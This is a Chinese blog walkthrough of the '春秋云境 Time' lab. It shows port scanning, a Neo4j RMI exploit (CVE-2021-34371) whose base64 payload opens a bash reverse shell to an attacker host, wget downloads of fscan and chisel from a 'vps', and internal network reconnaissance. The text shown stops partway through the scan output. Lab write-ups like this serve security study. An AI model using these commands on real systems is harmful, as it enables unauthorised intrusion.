@@ -1,0 +1,695 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>春秋云境 Time | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Neo4j-RCE"><span class="toc-number">2.</span> <span class="toc-text">Neo4j RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-amp-%E4%BB%A3%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集 &amp; 代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">sqlmap注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">5.</span> <span class="toc-text">AS-REP Roasting</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SID%E5%8E%86%E5%8F%B2%E5%8A%9F%E8%83%BD%E6%BB%A5%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">SID历史功能滥用</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>春秋云境 Time</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/2/25
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/%E6%B8%97%E9%80%8F/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Kerberos/" style="color: #00a596">Kerberos</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" style="color: #00bcd4">春秋云境</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2.8k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">14分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/08/31/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7time/">https://fushuling.com/index.php/2023/08/31/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7time/</a></p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/08/chunqiuyunjing-time-writeup/">https://exp10it.io/2023/08/chunqiuyunjing-time-writeup/</a></p>
+<p><a target="_blank" rel="noopener" href="https://bowuchuling.github.io/posts/chunqiu_Time">https://bowuchuling.github.io/posts/chunqiu_Time</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="Neo4j-RCE"><a href="#Neo4j-RCE" class="headerlink" title="Neo4j RCE"></a>Neo4j RCE</h1><p>fscan 开扫</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">39.98</span>.118.103 <span class="token parameter variable">-p</span> <span class="token number">1</span>-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:22
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:22 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span> Banner:<span class="token punctuation">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:1337
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:50<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:7473
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:50<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:7474
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:50<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:7687
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:1337 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:00<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:7473 <span class="token operator">=</span><span class="token operator">></span>  Banner:<span class="token punctuation">[</span>.P<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:00<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:7687 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:00<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:7474 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>http<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:06<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:37977
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:37977 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 存活端口数量: <span class="token number">6</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 开始漏洞扫描
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 加载的插件: neo4j, ssh, webpoc, webtitle
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:21<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 https://39.98.118.103:7687 状态码:400 长度:50     标题:无标题
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 扫描已完成: <span class="token number">4</span>/4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>7474 端口会进到 Neo4j Browser，开了 1337 端口即 rmi 服务，搜一下有CVE：<a target="_blank" rel="noopener" href="https://github.com/zwjjustdoit/CVE-2021-34371.jar">https://github.com/zwjjustdoit/CVE-2021-34371.jar</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> rhino_gadget.jar rmi://39.98.118.103:1337 <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEueHgueHgueHgvMzQ1NjcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225090903145.png" alt="image-20250225090903145"></p>
+<p>于是弹 shell 拿到flag</p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225091104211.png" alt="image-20250225091104211"></p>
+<p>flag01: <code>flag&#123;e53e9c48-8620-4ba8-8970-b3096bb23654&#125;</code></p>
+<p>提示 Do you know the authentication process of Kerberos?</p>
+<hr>
+<h1 id="信息收集-amp-代理"><a href="#信息收集-amp-代理" class="headerlink" title="信息收集 &amp; 代理"></a>信息收集 &amp; 代理</h1><p>wget 下载需要的工具到靶机的 &#x2F;tmp 下</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> vps:80/fscan
+<span class="token function">wget</span> vps:80/proxy/chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>信息收集，fscan 开扫</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">neo4j@ubuntu:/tmp$ <span class="token function">uname</span> <span class="token parameter variable">-a</span>
+<span class="token function">uname</span> <span class="token parameter variable">-a</span>
+Linux ubuntu <span class="token number">5.4</span>.0-113-generic <span class="token comment">#127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
+neo4j@ubuntu:/tmp$ <span class="token function">ifconfig</span>
+<span class="token function">ifconfig</span>
+eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
+        inet <span class="token number">172.22</span>.6.36  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.22</span>.255.255
+        inet6 fe80::216:3eff:fe1a:c242  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">></span>
+        ether 00:16:3e:1a:c2:42  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
+        RX packets <span class="token number">257111</span>  bytes <span class="token number">167794559</span> <span class="token punctuation">(</span><span class="token number">167.7</span> MB<span class="token punctuation">)</span>
+        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
+        TX packets <span class="token number">167723</span>  bytes <span class="token number">26424537</span> <span class="token punctuation">(</span><span class="token number">26.4</span> MB<span class="token punctuation">)</span>
+        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>
+
+lo: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,LOOPBACK,RUNNING<span class="token operator">></span>  mtu <span class="token number">65536</span>
+        inet <span class="token number">127.0</span>.0.1  netmask <span class="token number">255.0</span>.0.0
+        inet6 ::1  prefixlen <span class="token number">128</span>  scopeid 0x1<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>host<span class="token operator">></span>
+        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span>
+        RX packets <span class="token number">1396</span>  bytes <span class="token number">119685</span> <span class="token punctuation">(</span><span class="token number">119.6</span> KB<span class="token punctuation">)</span>
+        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
+        TX packets <span class="token number">1396</span>  bytes <span class="token number">119685</span> <span class="token punctuation">(</span><span class="token number">119.6</span> KB<span class="token punctuation">)</span>
+        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>
+
+neo4j@ubuntu:/tmp$ ./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.6.36/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标 <span class="token number">172.22</span>.6.36     存活 <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标 <span class="token number">172.22</span>.6.38     存活 <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标 <span class="token number">172.22</span>.6.12     存活 <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标 <span class="token number">172.22</span>.6.25     存活 <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 存活主机数量: <span class="token number">4</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 有效端口数量: <span class="token number">233</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.38:80
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.38:22
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.36:22
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:88
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.25:445
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:445
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:389
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.25:139
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:139
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.25:135
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:135
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.36:7687
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.38:22 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span> Banner:<span class="token punctuation">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.36:22 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span> Banner:<span class="token punctuation">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.38:80 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>http<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:88 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.25:445 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:445 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:389 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ldap<span class="token punctuation">]</span> 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.25:139 <span class="token operator">=</span><span class="token operator">></span>  Banner:<span class="token punctuation">[</span>.<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:139 <span class="token operator">=</span><span class="token operator">></span>  Banner:<span class="token punctuation">[</span>.<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:24<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.36:7687 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.25:135 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:135 <span class="token operator">=</span><span class="token operator">></span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 存活端口数量: <span class="token number">12</span>
